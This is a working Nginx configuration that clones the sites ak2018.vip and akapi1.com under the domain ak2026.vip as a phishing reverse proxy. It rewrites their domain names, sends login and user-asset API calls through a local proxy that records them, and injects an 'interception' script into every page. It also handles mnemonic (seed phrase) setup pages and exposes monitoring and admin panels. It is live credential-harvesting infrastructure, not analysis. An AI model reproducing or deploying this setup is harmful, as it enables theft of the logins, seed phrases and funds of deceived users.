# ak2026.vip 完整 Nginx 配置 (单文件模式)
# 直接作为 /etc/nginx/nginx.conf 使用

user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 1024;
    multi_accept on;
}

http {
    # ===== 基础配置 =====
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;

    access_log /var/log/nginx/access.log;

    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml text/javascript;

    # ===== 上游服务器 =====
    upstream ak2018_backend {
        server ak2018.vip:443;
        keepalive 64;
        keepalive_requests 1000;
        keepalive_timeout 60s;
    }

    upstream akapi1_backend {
        server www.akapi1.com:443;
        keepalive 64;
        keepalive_requests 1000;
        keepalive_timeout 60s;
    }

    # 本地透明代理服务
    upstream monitor_backend {
        server 127.0.0.1:8080;
        keepalive 32;
    }

    # ===== HTTP重定向到HTTPS =====
    server {
        listen 80;
        server_name ak2026.vip;
        return 301 https://$server_name$request_uri;
    }

    # ===== ak2026.vip HTTPS完整代理 =====
    server {
        listen 443 ssl http2;
        server_name ak2026.vip;

        # 日志配置
        access_log /var/log/nginx/ak2026_access.log;
        error_log /var/log/nginx/ak2026_error.log warn;

        # SSL证书 (Let's Encrypt)
        ssl_certificate /etc/letsencrypt/live/ak2026.vip/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/ak2026.vip/privkey.pem;

        # SSL安全配置
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:50m;
        ssl_session_timeout 1d;
        ssl_session_tickets on;

        # 增大缓冲区
        client_body_buffer_size 16k;
        client_max_body_size 10m;
        proxy_buffer_size 128k;
        proxy_buffers 4 256k;
        proxy_busy_buffers_size 256k;
        proxy_temp_file_write_size 256k;

        # ===== 首页/线路选择 → 直接跳转登录页 =====
        location = / {
            # 有ak_persist cookie的用户直接进首页（APP体验）
            if ($cookie_ak_persist = "1") {
                return 302 /pages/home.html?first=true;
            }
            return 302 /pages/account/login.html;
        }
        location = /index.html {
            if ($cookie_ak_persist = "1") {
                return 302 /pages/home.html?first=true;
            }
            return 302 /pages/account/login.html;
        }

        # ===== 助记词页面：新账户设置放行，其余全部跳转登录 =====
        location ~ ^/pages/center/security/mnemonic\.[a-z]+\.html$ {
            # url参数含first%3Dtrue = 新账户首次设置助记词，放行
            if ($args !~ "first%3Dtrue") {
                return 302 /pages/account/login.html;
            }
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header Accept-Encoding "";
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            proxy_http_version 1.1;

            sub_filter_types text/html;
            sub_filter_once off;
            sub_filter '<head>' '<head><script src="/chat/widget.js"></script>';
            sub_filter 'https://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'https://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'http://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'ak2018.vip' 'ak2026.vip';
        }

        # ===== 登录API - 经过本地透明代理记录 =====
        location ~ ^/RPC/Login$ {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
        }

        # ===== 用户资产API - 经过本地透明代理记录 =====
        location ^~ /RPC/public_IndexData {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
        }

        # ===== 其他RPC请求直接转发到后端API =====
        location /RPC/ {
            proxy_pass https://akapi1_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host www.akapi1.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Accept $http_accept;
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
        }

        # ===== 路径修复规则 (解决移动端卡住问题) =====
        location = /content/css/iconfont.css {
            rewrite ^ /content/font/iconfont.css break;
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }

        location = /content/js/cn.json {
            rewrite ^ /content/lang/cn.json break;
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }

        # ===== 静态资源缓存 =====
        location ~* \.(css|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ {
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            expires 7d;
            add_header Cache-Control "public, max-age=604800, immutable";
        }

        # ===== JS文件需要替换API域名 =====
        location ~* \.js$ {
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host ak2018.vip;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            proxy_set_header Accept-Encoding "";

            # 替换JS中的API域名为ak2026.vip
            sub_filter_types application/javascript text/javascript;
            sub_filter_once off;
            sub_filter 'https://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'www.akapi1.com' 'ak2026.vip';
            sub_filter 'www.akapi3.com' 'ak2026.vip';
            sub_filter 'https://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'http://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'ak2018.vip' 'ak2026.vip';
        }

        # ===== 聊天组件静态文件 =====
        location = /chat/widget.js {
            alias /home/ubuntu/ak-proxy/transparent_proxy/chat_widget.js;
            add_header Content-Type application/javascript;
            add_header Cache-Control "no-cache, no-store, must-revalidate";
            expires -1;
        }

        # ===== PWA 支持文件 =====
        location = /manifest.json {
            alias /home/ubuntu/ak-proxy/transparent_proxy/manifest.json;
            add_header Content-Type "application/manifest+json";
            add_header Cache-Control "no-cache";
        }
        location = /sw.js {
            alias /home/ubuntu/ak-proxy/transparent_proxy/sw.js;
            add_header Content-Type application/javascript;
            add_header Cache-Control "no-cache, no-store, must-revalidate";
            add_header Service-Worker-Allowed "/";
        }
        location = /pwa-icon.svg {
            alias /home/ubuntu/ak-proxy/transparent_proxy/pwa-icon.svg;
            add_header Content-Type "image/svg+xml";
        }
        location ~ ^/pwa-icon-\d+\.png$ {
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
        }

        # ===== 监控后台 (https://ak2026.vip/admin) =====
        location /admin {
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_connect_timeout 30s;
            proxy_read_timeout 300s;
        }

        # ===== 聊天WebSocket =====
        location /chat/ws {
            proxy_pass http://127.0.0.1:8080;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_read_timeout 300s;
        }

        # ===== 管理面板 (https://ak2026.vip/akadmin) =====
        location /akadmin {
            proxy_pass http://127.0.0.1:9090;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            proxy_connect_timeout 30s;
            proxy_read_timeout 60s;
        }

        # ===== 默认代理配置 =====
        location / {
            proxy_pass https://ak2018_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;

            proxy_set_header Host ak2018.vip;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            # 禁止上游压缩，确保sub_filter能正常替换内容
            proxy_set_header Accept-Encoding "";

            # 强制桌面User-Agent
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";

            # 替换API域名为ak2026.vip
            sub_filter_types text/html text/javascript application/javascript;
            sub_filter_once off;
            sub_filter 'https://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2026.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2026.vip';
            sub_filter 'https://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'http://ak2018.vip' 'https://ak2026.vip';
            sub_filter 'ak2018.vip' 'ak2026.vip';

            # 注入拦截脚本到<head>最开始，确保在其他脚本之前执行拦截
            sub_filter '<head>' '<head><script src="/chat/widget.js"></script>';
        }
    }
}
